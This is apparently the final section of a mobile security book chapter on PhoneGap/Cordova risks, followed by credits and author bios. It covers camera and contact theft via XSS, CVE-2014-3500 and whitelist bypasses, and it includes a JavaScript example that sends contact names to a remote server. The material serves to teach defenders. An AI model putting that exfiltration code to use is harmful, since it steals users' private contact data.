### Camera Configuration and Security Concerns in PhoneGap Applications

#### Camera Configuration
```javascript
{
  quality: 50,
  destinationType: Camera.DestinationType.DATA_URL,
  sourceType: Camera.PictureSourceType.CAMERA
}
```
This configuration will take a photo using the device's camera and return a base64-encoded string to the `onPhotoDataSuccess()` callback. In a cross-site scripting (XSS) attack on a PhoneGap application, a malicious payload could exploit this feature to take a photo and upload the base64-encoded image to an attacker-controlled server using `XMLHttpRequest()` or the `FileTransfer.upload()` method of the PhoneGap API.

#### Accessing Device Contacts
A malicious payload could also steal the device’s contact database using the PhoneGap JavaScript API. For example, to search for a user named "Herman" and upload their contact information to a remote web server, the following code can be used:

```javascript
function onSuccess(contacts) {
  var url = "http://www.mobileapphacker.com/getcontact";
  var params = "givenname=" + contacts[0].name.givenName + "&familyname=" + contacts[0].name.familyName;
  var http = new XMLHttpRequest();
  http.open("GET", url + "?" + params, true);
  http.send();
}

function onError(contactError) {
  alert('onError!');
}

var options = new ContactFindOptions();
options.filter = "Herman";
options.multiple = true;
options.desiredFields = [navigator.contacts.fieldType.id];

var fields = [navigator.contacts.fieldType.displayName, navigator.contacts.fieldType.name];
navigator.contacts.find(fields, onSuccess, onError, options);
```

#### Security Considerations in PhoneGap and Cordova
PhoneGap and Cordova applications blend native mobile and web functionalities, making them susceptible to both types of security vulnerabilities. While these frameworks have not been extensively scrutinized by the security community, many general web and mobile security principles apply. This section details specific security considerations for these frameworks.

##### HTML5-Specific Security Concerns
Cordova applications heavily rely on HTML5, which introduces its own set of security concerns. These are detailed in the OWASP HTML5 Security Cheat Sheet: [OWASP HTML5 Security Cheat Sheet](https://www.owasp.org/index.php/HTML5_Security_Cheat_Sheet).

##### Multiple Vulnerabilities in the Cordova Framework
In August 2014, David Kaplan and Roee Hay disclosed a series of vulnerabilities affecting versions prior to 3.5.1 of the Cordova framework. When chained together with some user interaction, these vulnerabilities could exfiltrate data from the filesystem of an Android device running a Cordova-based application. For more information, refer to the whitepaper: [Remote Exploitation of the Cordova Framework](https://www.slideshare.net/ibmsecurity/remote-exploitation-of-the-cordova-framework/).

##### Cross-Application and Cross-Site Scripting Attacks
Cross-platform frameworks depend on the embedded Webview browser, which can be exploited through cross-application scripting (XAS) and cross-site scripting (XSS) attacks. XAS attacks occur when another application loads scripting into the Webview. Common scenarios include:
- Tainted content loaded from a server-side web application (XSS) to the Webview.
- Arbitrary URLs passed from IPC mechanisms (XAS) loaded into the Webview.
- Arbitrary data loaded via an IPC mechanism and dynamically populated into a JavaScript block or passed directly to `eval()` (XAS).

An example of such a vulnerability is described in CVE-2014-3500, where an arbitrary URL could be loaded into a Cordova Webview when another third-party application invoked an intent. The vulnerable code in the `CordovaWebView` class is as follows:

```java
public void loadUrl(String url) {
  if(url.equals("about:blank") || url.startsWith("javascript:")) {
    this.loadUrlNow(url);
  } else {
    String initUrl = this.getProperty("url", null);
    if (initUrl == null) {
      this.loadUrlIntoView(url);
    } else {
      this.loadUrlIntoView(initUrl);
    }
  }
}

public String getProperty(String name, String defaultValue) {
  Bundle bundle = this.cordova.getActivity().getIntent().getExtras();
  if (bundle == null) {
    return defaultValue;
  }
  Object p = bundle.get(name);
  if (p == null) {
    return defaultValue;
  }
  return p.toString();
}
```

Launching the activity with an intent bundle that includes a malicious URL would cause it to be populated into the Webview. For more details, refer to the whitepaper: [Remote Exploitation of the Cordova Framework](https://www.slideshare.net/ibmsecurity/remote-exploitation-of-the-cordova-framework/).

##### Domain Whitelisting
Domain whitelisting is a security control in PhoneGap and other Cordova-based applications, defining external domains that should be permitted access. The whitelist can be configured in the `config.xml` file, for example:

```xml
<access origin="https://mobileapphacker.com" subdomains="false" />
```

This permits access to any resources on the `mobileapphacker.com` domain but not subdomains, and only when using the HTTPS protocol. An insecure whitelist allowing unrestricted access to any domain would look like:

```xml
<access origin="*" />
```

This is also the default configuration for a Cordova-based application. Domain whitelisting is crucial for controlling resource access, but it has been found to be subvertible. For instance, in Cordova 2.9.x, substrings of the domain could bypass the whitelist. This was fixed in Cordova 3.x.

##### Platform-Specific Quirks
- **Android**: Domain whitelisting is not supported on Android applications or devices using API 10 or lower.
- **Windows Phone 7 and 8**: Whitelisting can be bypassed by using an iframe or `XMLHttpRequest()`, allowing an attacker to load any domain in an iframe or with AJAX, giving it access to the Cordova bridge.

##### Apache Cordova Whitelist Bypass for Non-HTTP URLs
Apache Cordova for Android overloads the `shouldInterceptRequest()` method to intercept and inspect URLs before they are loaded. However, some protocols, such as Web Sockets, cannot be intercepted, allowing them to bypass the Cordova whitelisting implementation.

##### Iframes and Callbacks
When a whitelisted domain is loaded into the Webview, it has implicit access to the Cordova bridge. If the whitelisted domain loads content via an iframe, the loaded content will also have access to the bridge. For example, whitelisting an advertising network that loads ads via an iframe could inadvertently expose the Cordova bridge to any third-party sites. On iOS, all URLs are intercepted, mitigating this risk.

##### Encrypted Storage
Cordova’s filesystem APIs do not support encryption and rely on the platform's default behavior. For example, Cordova applications on iOS 7 or above inherit the default data protection class C (`kSecAttrAccessibleAfterFirstUnlock`) for data at rest encryption. On platforms like Windows Phone, where encryption is not supported by default, content may be stored in plaintext. Solutions include using native plugins like SQLCipher or platform-specific workarounds using the Android keystore or iOS keychain.

### Summary
This chapter introduced the concept of cross-platform mobile applications and the associated security concerns. Key considerations include the presence and exposure of native bridges, methods of implementing and exploiting these bridges, and the use of whitelisting to reduce exposure. As the trend for developing cross-platform applications grows, they will likely come under greater scrutiny from the security community, leading to the discovery of new attack vectors.

### Acknowledgments
The authors express gratitude to their families, colleagues, and the wider security community for their support and contributions. Special thanks go to the editorial team at Wiley for their invaluable assistance in developing and polishing the manuscript.

### About the Authors
- **Dominic Chell**: Co-founder of MDSec, focused on mobile practice and consultancy.
- **Tyrone Erasmus**: Head of mobile security at MWR InfoSecurity South Africa, with expertise in penetration testing and security research.
- **Shaun Colley**: Principal security consultant at IOActive, specializing in mobile device security and reverse engineering.
- **Ollie Whitehouse**: Technical director at NCC Group, responsible for cyber defense operations and technical innovation.

### About the Technical Editor
**Rob Shimonski**: Best-selling author and editor with over 15 years of experience in IT, networking, systems, and security. Rob has worked for companies like CompTIA, Microsoft, and the National Security Agency.

### Credits
- **Executive Editor**: Carol Long
- **Project Editor**: Sydney Argenta
- **Technical Editor**: Rob Shimonski
- **Production Editor**: Rebecca Anderson
- **Copy Editor**: Paula Lowell
- **Manager of Content Development and Assembly**: Mary Beth Wakefield
- **Marketing Director**: David Mayhew
- **Marketing Manager**: Carrie Sherrill
- **Professional Technology and Strategy Director**: Barry Pruett
- **Business Manager**: Amy Knies
- **Associate Publisher**: Jim Minatel
- **Project Coordinator, Cover**: Patrick Redmond
- **Proofreader**: Sarah Kaikini, Word One New York
- **Indexer**: Johnna VanHoose Dinse
- **Cover Designer**: Wiley
- **Cover Image**: Clockwork gears © iStock.com/Ryhor Bruyeu; App icon © iStock.com/-cuba-

### WILEY END USER LICENSE AGREEMENT
For more information, visit [Wiley’s ebook EULA](https://www.wiley.com/go/eula).